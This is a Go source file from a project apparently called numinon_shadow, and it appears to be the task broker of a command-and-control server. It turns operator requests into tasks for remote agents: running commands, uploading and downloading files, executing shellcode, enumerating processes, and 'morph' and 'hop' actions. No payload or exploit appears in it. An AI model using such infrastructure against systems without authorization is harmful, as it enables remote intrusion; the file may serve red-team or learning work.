package taskbroker

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/clientapi"
	"numinon_shadow/internal/models"
	"numinon_shadow/internal/orchestration"
	"numinon_shadow/internal/taskmanager"
	"sync"
)

// mapActionToCommand converts client API actions to internal command names.
// This is our "translation dictionary" between what operators say and what agents understand.
func (b *Broker) mapActionToCommand(action clientapi.ActionType) (string, error) {
	switch action {
	case clientapi.ActionTaskAgentRunCmd:
		return "run_cmd", nil
	case clientapi.ActionTaskAgentUploadFile:
		return "upload", nil
	case clientapi.ActionTaskAgentDownloadFile:
		return "download", nil
	case clientapi.ActionTaskAgentExecuteShellcode:
		return "shellcode", nil
	case clientapi.ActionTaskAgentEnumerateProcs:
		return "enumerate", nil
	case clientapi.ActionTaskAgentMorph:
		return "morph", nil
	case clientapi.ActionTaskAgentHop:
		return "hop", nil
	default:
		return "", fmt.Errorf("no command mapping for action: %s", action)
	}
}

// Broker implements clientapi.TaskBroker interface.
// It acts as the bridge between operator requests and the core task system from the server layer.
//
// Key responsibilities:
// 1. Translate operator task requests into system tasks
// 2. Track which operator created which task
// 3. Route task results back to the correct operator
// 4. Handle protocol-specific task delivery (immediate for WS, queued for HTTP)
type Broker struct {
	// Core dependencies
	taskStore     taskmanager.TaskManager        // The actual task storage
	orchestrators *orchestration.Registry        // For task preparation/validation
	clientMgr     clientapi.ClientSessionManager // To send results back to operators

	// Tracking mappings
	mu         sync.RWMutex
	taskOwners map[string]string // taskID -> operatorSessionID

	// TODO: Add agent tracker to determine if agent is WS-connected for immediate push
}

// NewBroker creates a new task broker with the necessary dependencies.
func NewBroker(
	taskStore taskmanager.TaskManager,
	orchestrators *orchestration.Registry,
	clientMgr clientapi.ClientSessionManager,
) *Broker {
	return &Broker{
		taskStore:     taskStore,
		orchestrators: orchestrators,
		clientMgr:     clientMgr,
		taskOwners:    make(map[string]string),
	}
}

// QueueAgentTask implements clientapi.TaskBroker interface.
// This is called when an operator wants to task an agent.
func (b *Broker) QueueAgentTask(ctx context.Context, req clientapi.ClientRequest, operatorSessionID string) (clientapi.ServerResponse, error) {
	log.Printf("[TASK BROKER] Operator %s requesting action: %s", operatorSessionID, req.Action)

	// Step 1: Determine what kind of task this is
	var agentID string
	var command string
	var args json.RawMessage

	// Parse the payload based on action type
	switch req.Action {

	// RUN_CMD IMPLEMENTATION
	case clientapi.ActionTaskAgentRunCmd:
		command = "run_cmd"
		var payload clientapi.TaskAgentPayload
		if err := json.Unmarshal(req.Payload, &payload); err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid payload for run_cmd: %v", err),
			}, err
		}
		agentID = payload.AgentID

		// Re-marshal the command-specific args
		argsBytes, err := json.Marshal(payload.Args)
		if err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid arguments for run_cmd: %v", err),
			}, err
		}
		args = argsBytes

	// UPLOAD IMPLEMENTATION
	case clientapi.ActionTaskAgentUploadFile:
		command = "upload"

		var payload clientapi.TaskAgentPayload
		if err := json.Unmarshal(req.Payload, &payload); err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid payload for upload: %v", err),
			}, err
		}
		agentID = payload.AgentID
		argsBytes, err := json.Marshal(payload.Args)
		if err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid arguments for upload: %v", err),
			}, err
		}
		args = argsBytes

	// DOWNLOAD IMPLEMENTATION
	case clientapi.ActionTaskAgentDownloadFile:
		command = "download"
		var payload clientapi.TaskAgentPayload
		if err := json.Unmarshal(req.Payload, &payload); err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid payload for download: %v", err),
			}, err
		}
		agentID = payload.AgentID

		argsBytes, err := json.Marshal(payload.Args)
		if err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid arguments for download: %v", err),
			}, err
		}
		args = argsBytes

		// ENUMERATE IMPLEMENTATION
	case clientapi.ActionTaskAgentEnumerateProcs:
		command = "enumerate"
		var payload clientapi.TaskAgentPayload
		if err := json.Unmarshal(req.Payload, &payload); err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid payload for enumerate: %v", err),
			}, err
		}
		agentID = payload.AgentID

		argsBytes, err := json.Marshal(payload.Args)
		if err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid arguments for enumerate: %v", err),
			}, err
		}
		args = argsBytes

		// MORPH IMPLEMENTATION
	case clientapi.ActionTaskAgentMorph:
		command = "morph"
		var payload clientapi.TaskAgentPayload
		if err := json.Unmarshal(req.Payload, &payload); err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid payload for morph: %v", err),
			}, err
		}
		agentID = payload.AgentID

		argsBytes, err := json.Marshal(payload.Args)
		if err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid arguments for morph: %v", err),
			}, err
		}
		args = argsBytes

		// SHELLCODE IMPLEMENTATION
	case clientapi.ActionTaskAgentExecuteShellcode:
		command = "shellcode"
		var payload clientapi.TaskAgentPayload
		if err := json.Unmarshal(req.Payload, &payload); err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid payload for shellcode: %v", err),
			}, err
		}
		agentID = payload.AgentID

		argsBytes, err := json.Marshal(payload.Args)
		if err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid arguments for shellcode: %v", err),
			}, err
		}
		args = argsBytes

		// HOP IMPLEMENTATION
	case clientapi.ActionTaskAgentHop:
		command = "hop"
		var payload clientapi.TaskAgentPayload
		if err := json.Unmarshal(req.Payload, &payload); err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid payload for hop: %v", err),
			}, err
		}
		agentID = payload.AgentID

		argsBytes, err := json.Marshal(payload.Args)
		if err != nil {
			return clientapi.ServerResponse{
				RequestID: req.RequestID,
				Status:    clientapi.StatusError,
				Error:     fmt.Sprintf("invalid arguments for hop: %v", err),
			}, err
		}
		args = argsBytes

	default:
		return clientapi.ServerResponse{
			RequestID: req.RequestID,
			Status:    clientapi.StatusError,
			Error:     fmt.Sprintf("unsupported action: %s", req.Action),
		}, fmt.Errorf("unsupported action: %s", req.Action)
	}

	// Step 2: Create the task in the core system
	task, err := b.taskStore.CreateTask(agentID, command, args)
	if err != nil {
		return clientapi.ServerResponse{
			RequestID: req.RequestID,
			Status:    clientapi.StatusError,
			Error:     fmt.Sprintf("failed to create task: %v", err),
		}, err
	}

	// Step 3: Use orchestrators to prepare/validate the task
	if err := b.orchestrators.PrepareTask(task); err != nil {
		// Task creation succeeded but preparation failed - mark it as failed
		b.taskStore.MarkFailed(task.ID, err.Error())
		return clientapi.ServerResponse{
			RequestID: req.RequestID,
			Status:    clientapi.StatusError,
			Error:     fmt.Sprintf("task preparation failed: %v", err),
		}, err
	}

	// Step 4: Track which operator created this task
	b.mu.Lock()
	b.taskOwners[task.ID] = operatorSessionID
	b.mu.Unlock()

	log.Printf("[TASK BROKER] Created task %s for agent %s on behalf of operator %s",
		task.ID, agentID, operatorSessionID)

	// Step 5: Return acknowledgment to operator
	confirmationPayload := clientapi.TaskQueuedConfirmationPayload{
		AgentID: agentID,
		TaskID:  task.ID,
		Message: fmt.Sprintf("Task queued for agent %s", agentID),
	}

	payloadBytes, _ := json.Marshal(confirmationPayload)

	// TODO Check if agent is WS-connected and trigger immediate push
	// For now, we just queue it and let the agent pick it up on next check-in

	return clientapi.ServerResponse{
		RequestID: req.RequestID,
		Status:    clientapi.StatusSuccess,
		Action:    req.Action,
		DataType:  clientapi.DataTypeTaskQueuedConfirmation,
		Payload:   payloadBytes,
	}, nil
}

// ProcessAgentResult implements clientapi.TaskBroker interface.
// This is called when an agent returns a task result.
func (b *Broker) ProcessAgentResult(result models.AgentTaskResult) error {

	log.Printf("[TASK BROKER] Processing result for task %s", result.TaskID)

	// TODO: Implementation will:
	// 1. Look up which operator created this task
	// 2. Format the result for operator consumption
	// 3. Send result to operator via clientMgr

	return nil
}

// GetTaskOwner returns the operator session that created a task.
func (b *Broker) GetTaskOwner(taskID string) (string, error) {
	b.mu.RLock()
	defer b.mu.RUnlock()

	operatorID, exists := b.taskOwners[taskID]
	if !exists {
		return "", fmt.Errorf("no owner found for task %s", taskID)
	}

	return operatorID, nil
}
